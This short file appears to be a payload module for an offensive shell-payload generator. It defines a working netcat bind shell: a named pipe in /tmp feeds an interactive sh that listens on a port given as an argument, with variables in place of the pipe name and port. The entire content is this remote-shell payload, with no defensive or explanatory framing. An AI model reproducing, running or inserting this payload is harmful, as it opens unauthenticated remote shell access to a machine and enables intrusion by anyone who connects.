USAGE = 'port'
NARGS = [1, 1]
LANG = 'sh'
EXEC = 'PAYLOAD'

pl = '''
rm /tmp/VAR1;mkfifo /tmp/VAR1;cat /tmp/VAR1|sh -i 2>&1|nc -lp ARG1>/tmp/VAR1;rm /tmp/VAR1
'''
